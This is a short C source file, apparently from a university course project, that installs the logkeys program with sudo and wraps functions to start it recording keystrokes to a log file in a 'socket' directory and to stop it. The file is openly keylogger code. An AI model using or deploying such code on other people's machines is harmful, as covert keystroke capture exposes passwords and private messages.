#include <stdlib.h>

void keylogger_init(){
	system("sudo apt-get install logkeys");
}
void keylogger_start(){
	system("touch /CSE2431_Project/socket/keyPressed.log");
	system("sudo logkeys --start -m /CSE2431_Project/Keylogger/en_US_ubuntu_1204.map  --output /CSE2431_Project/socket/keyPressed.log");
}

void keylogger_end(){
	system("sudo logkeys --kill");
}
